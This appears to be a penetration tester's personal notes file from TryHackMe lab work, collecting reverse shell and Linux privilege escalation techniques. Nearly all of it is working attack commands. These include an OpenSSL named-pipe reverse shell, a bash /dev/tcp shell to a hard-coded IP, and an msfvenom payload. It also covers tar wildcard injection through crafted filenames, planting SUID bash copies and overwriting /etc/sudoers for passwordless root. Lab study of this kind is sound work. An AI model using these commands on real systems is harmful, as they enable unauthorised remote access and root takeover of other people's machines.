******************* Look at notes THM room Game Zone README.md for various techniques.

# OpenSSL Reverse Shell
[Generate OpenSSL Certificate](../../SSL/OpenSSL/README.md#Generate-SSL-Certificate)
[Start OpenSSL Listener](../../SSL/OpenSSL/README.md#Start-OpenSSL-Listener)
##### From Target, create named pipe and OpenSSL client to connect to Attack Machine.
```bash
# On Target
mkfifo /tmp/x; /bin/sh -i < /tmp/x 2>&1 | openssl s_client -quiet -connect <Attack IP ADdress>:443 > /tmp/x; rm /tmp/x
```

# ICMP Reverse Shell with icmpsh
##### Disable ICMP replies by the OS
```bash
sysctl -w net.ipv4.icmp_echo_ignore_all=1
```
## ICMP Reverse Shell References
[Github icmpsh](https://github.com/bdamele/icmpsh)

[Pentestlab Blog](https://pentestlab.blog/tag/icmpsh/)

[Security Online](https://securityonline.info/icmpsh-simple-reverse-icmp-shell/)

# CronJobs - File Permissions 
```bash
cat /etc/crontab
# IF CronJobs runs a <file>.sh script, edit <file>.sh to establish a reverse shell.
```

# CronJobs - Wildcard
```bash
cat /etc/crontab
# Find CronJobs using wildcards.
# Search GTFObins for CronJob command.

# Find out the time to see when the next job will run.
date

### NOTE - I had problems making the scripts executable and callng them.
### Using exec=sh <script>.sh worked, when the others did not.
### See notes from THM Skynet room.
### I was unable to establish a reverse shell.
### Scripts that I chmod +x did not execute.
### Calling he scripts with sh worked.
echo "" > "--checkpoint-action=exec=sh <script>.sh"

# Example using tar.
# Create reverse shell binary with msfvenom.
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<local IP> LPORT=<port num> -f elf -o shell.elf
# Copy shell.elf to server.
# Make shell.elf executable, on server.
chmod +x /home/user/shell.elf
# Start listener.
nc -nvlp <port num>
# Create these two files in /home/user:
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
# These filenames will be read as tar arguments, causing tar to execute shell.elf.

## ALTERNATIVES
# Use a bash shell.
echo "bash -i >& /dev/tcp/10.13.25.242/9999 0>&1" > shell.sh
chmod +x shell.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.sh
# Make /bin/bash a SUID.
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
chmod +x shell.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.sh
# Copy /bin/bash to a /tmp and make SUID.
printf '#!/bin/bash\ncp /bin/bash /tmp/newbinbash && chmod +s /tmp/newbinbash' > newbinbash.sh
chmod +x newbinbash.sh
touch /var/www/html/--checkpoint=1
touch /var/www/html/--checkpoint-action=exec=newbinbash.sh
# Make the current user a sudoer.
echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
chmod +x privesc.sh
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=privesc.sh
```

### CronJobs - Wildcard References
[Exploiting Wildcard for Privilege Escalation](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/)

# [Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell/)
##### Note: The methods above will not work in every situation. For example, I have regularly run into a problem on my Kali machine where attempting to use stty raw -echo while using zsh as my shell will cause the entire terminal to become unusable. I have gotten around this issue by switching to bash before I start any netcat listener that I will be using to catch a shell.
```bash
bash
rlwrap nc -lvnp $port
which python python2 python3
/usr/bin/python3 -c "import pty; pty.spawn('/bin/bash')"; #spawn a python psuedo-shell
CTRL+Z # to background shell
stty raw -echo # Send control characters to the shell.
stty size # Get terminal window size 48 / 102
fg # foreground shell
export SHELL=bash
stty rows $x columns $y #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

# [WordPress Reverse Shell](https://www.hackingarticles.in/wordpress-reverse-shell/)

# Cheatsheets
[HighOn.Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

[Pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

# References
[Staged vs Stageless Handlers](https://buffered.io/posts/staged-vs-stageless-handlers/)

[Upgrade a linux reverse shell to a fully usable TTY shell](https://zweilosec.github.io/posts/upgrade-linux-shell/)

[WordPress: Reverse Shell](https://www.hackingarticles.in/wordpress-reverse-shell/)